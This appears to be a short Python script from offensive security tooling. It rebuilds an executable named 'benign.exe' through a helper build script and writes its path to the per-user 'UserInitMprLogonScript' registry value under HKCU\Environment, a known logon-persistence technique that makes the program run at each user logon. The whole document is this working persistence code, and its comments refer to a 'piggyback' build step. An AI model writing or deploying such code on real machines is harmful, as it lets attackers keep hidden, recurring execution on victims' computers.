import os, shutil, winreg

filedir = os.path.join(os.getcwd(), "Temp")
filename = "benign.exe"
filepath = os.path.join(filedir, filename)

if os.path.isfile(filepath):
    os.remove(filepath)

# same piggyback as before to make an exe
os.system("python build_usb.py")

shutil.move(filepath, filedir)

reghive = winreg.HKEY_CURRENT_USER
regpath = "Environment"

# writing the regkey to the Logon script registry
reg = winreg.ConnectRegistry(None, reghive)
key = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_WRITE)
winreg.SetValueEx(key, "UserInitMprLogonScript", 0, winreg.REG_SZ, filepath)


